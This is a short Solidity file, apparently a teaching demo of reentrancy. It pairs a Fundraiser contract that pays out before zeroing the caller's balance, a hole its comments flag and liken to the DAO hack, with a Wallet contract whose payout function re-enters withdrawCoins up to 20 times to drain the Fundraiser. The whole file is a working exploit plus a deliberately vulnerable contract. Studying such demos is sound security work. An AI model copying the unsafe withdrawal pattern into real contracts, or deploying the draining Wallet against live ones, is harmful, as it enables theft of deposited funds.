pragma solidity ^0.4.24;

contract Fundraiser {
    mapping(address => uint) balances;
    
    function withdrawCoins() public{
        uint withdrawAmount = balances[msg.sender];
        Wallet wallet = Wallet(msg.sender);
        //The vulnerable line. The payout function, existing inside the Wallet contract
        //will withdraw the money before setting the balance to 0. If a loop starts over
        //withdrawCoins(), it will drain the money inside the contract, like in the DAO
        //hack, that resulted in over 60 million dollars of losses.
        wallet.payout.value(withdrawAmount)();
        balances[msg.sender] = 0;
        
    }
    
    function getBalance() public constant returns (uint) {
        return address(this).balance;
    }
    
    function contribute() public payable {
        balances[msg.sender] += msg.value;
    }
    
    function() public payable {
        
    }
}

contract Wallet {
    
    Fundraiser fundraiser;
    
    //Additional value just for setting the hacky function
    uint recursion = 20;
    
    constructor(address fundraiserAddress) public {
        fundraiser = Fundraiser(fundraiserAddress);
    }
    
    function contribute(uint amount) public {
        fundraiser.contribute.value(amount)();
    }
    
    function withdraw() public {
        fundraiser.withdrawCoins();
    }
    
    function getBalance() public constant returns (uint) {
        return address(this).balance;
    }
    
    function payout() public payable {
        
        //This function will call the withdrawCoins function from the fundraiser contract
        //multiple times while recursion (here set as 20), is bigger than 0, draining
        //money 20 times as much as you contribute to it.
        if (recursion > 0) {
            recursion--;
            fundraiser.withdrawCoins();
        }
        
    }
}

